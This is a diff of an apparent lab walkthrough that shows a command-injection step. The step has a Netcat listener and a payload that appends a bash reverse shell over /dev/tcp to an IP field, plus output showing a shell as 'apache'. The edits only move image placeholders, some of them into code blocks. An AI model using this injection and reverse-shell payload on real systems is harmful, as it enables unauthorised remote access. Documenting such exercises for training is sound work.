@@ -52,11 +52,17 @@ By appending an operator payload, the system command syntax was hijacked.
 1. A Netcat listener was established on the attacker host:
    ```bash
    nc -lvnp 4444
+   <!-- 🖼️ PLACE THIRD IMAGE HERE -->
+![Initial Access Foothold](images/foothold_lvl2.png)
+*Figure 4: Successfully catching the interactive shell session using a Netcat listener.*
    ```
 2. The following unified logical payload was delivered through the execution processing script:
    ```text
    192.168.0.21 && bash -i >& /dev/tcp/192.168.0.21/4444 0>&1
-  
+  <!-- 🖼️ PLACE SECOND IMAGE HERE -->
+ ![Nmap Scan Results](images/sql_command2_lvl2.png)
+ 
+*Figure 3: unified logical payload.*
    ```
 
 **Result:** The web server executed the background task and sent back an interactive reverse shell session to the listener terminal as low-privilege web execution profile `apache`.
@@ -67,14 +73,9 @@ bash-3.00\$ whoami
 apache
 ```
 
-<!-- 🖼️ PLACE SECOND IMAGE HERE -->
- ![Nmap Scan Results](images/sql_command2_lvl2.png)
- 
-*Figure 3: unified logical payload.*
 
-<!-- 🖼️ PLACE THIRD IMAGE HERE -->
-![Initial Access Foothold](images/foothold_lvl2.png)
-*Figure 4: Successfully catching the interactive shell session using a Netcat listener.*
+
+
 
 
 ## 📈 Stage 3: Local Privilege Escalation (Root)
